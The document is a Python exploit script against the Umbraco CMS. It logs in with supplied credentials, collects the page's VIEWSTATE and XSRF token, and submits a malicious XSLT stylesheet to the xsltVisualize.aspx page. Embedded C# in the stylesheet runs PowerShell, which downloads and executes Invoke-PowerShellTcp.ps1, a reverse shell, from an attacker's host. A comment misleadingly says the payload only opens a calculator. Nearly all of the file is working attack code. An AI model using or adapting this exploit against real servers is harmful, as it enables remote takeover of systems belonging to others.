#!/usr/bin/env python
import requests;

from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());
    
print("Start");

# Execute a calc for the PoC
payload = """<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "iex (New-Object Net.WebClient).DownloadString('http://<IP>:<port>/Invoke-PowerShellTcp.ps1')"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> """;

login = "<umbraco username>";
password="<umbraco password>";
host = "http://<server_ip>";

# Step 1 - Get Main page

s = requests.session()

url_main =host+"/umbraco/";
r1 = s.get(url_main);

print_dict(r1.cookies);

# Step 2 - Process Login
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";

loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);

# Step 3 - Go to vulnerable web page
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack
r4 = s.post(url_xslt,data=data,headers=headers);

print("End");
